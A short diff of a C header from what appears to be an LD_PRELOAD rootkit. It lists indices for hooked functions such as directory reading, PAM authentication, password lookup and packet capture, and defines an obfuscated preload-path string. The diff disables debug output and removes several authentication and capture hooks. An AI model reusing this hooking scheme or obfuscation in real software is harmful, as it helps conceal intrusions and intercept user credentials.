@@ -2,7 +2,7 @@
 #define _GNU_SOURCE
 #ifndef CONST_H
 #define CONST_H
-#define DEBUG_APP 
+//#define DEBUG_APP 
 #ifdef DEBUG_APP
 #define DEBUG(...) fprintf(stderr, __VA_ARGS__);
 #else
@@ -35,13 +35,6 @@
 #define SYS_OPENDIR 14
 #define SYS_READDIR 15
 #define SYS_READDIR64 16
-#define SYS_PAM_AUTHENTICATE 17
-#define SYS_PAM_OPEN_SESSION 18
-#define SYS_PAM_ACCT_MGMT 19
-#define SYS_GETPWNAM 20
-#define SYS_PAM_SM_AUTHENTICATE 21
-#define SYS_GETPWNAM_R 22
-#define SYS_PCAP_LOOP 23
 #define SYSCALL_SIZE 17
 
 #define LD_NORMAL "\xd1\x9b\x8a\x9d\xd1\x92\x9a\xd0\x8d\x91\xd0\x8e\x8c\x9b\x92\x91\x9f\x9a"
